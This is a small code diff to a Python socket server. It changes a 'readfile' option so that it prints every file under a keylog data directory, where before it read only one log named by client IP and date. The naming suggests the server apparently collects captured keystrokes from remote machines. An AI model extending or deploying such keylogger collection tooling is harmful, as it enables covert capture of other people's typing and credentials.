@@ -1,7 +1,9 @@
 import argparse
+import os
 import socket
 import threading
 import time
+import glob
 
 from env import *
 import datetime
@@ -90,12 +92,16 @@ if __name__ == '__main__':
     receiver_t.start()
 
     if argument.readfile:
-        client_address = server_socket.getpeername()
-        ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
+        path = '/keylog/data/'
+        fics = glob.glob(os.path.join(path, '*'))
 
-        with open("/keylogs/data/" + ficname, "r") as f:
-            file = f.read()
-            print(file)
+        #client_address = server_socket.getpeername()
+        #ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
+
+        for fic in fics :
+            with open(fic, "r") as f:
+                file = f.read()
+                print(file)
 
     # commands_t = threading.Thread(target=commands)
 
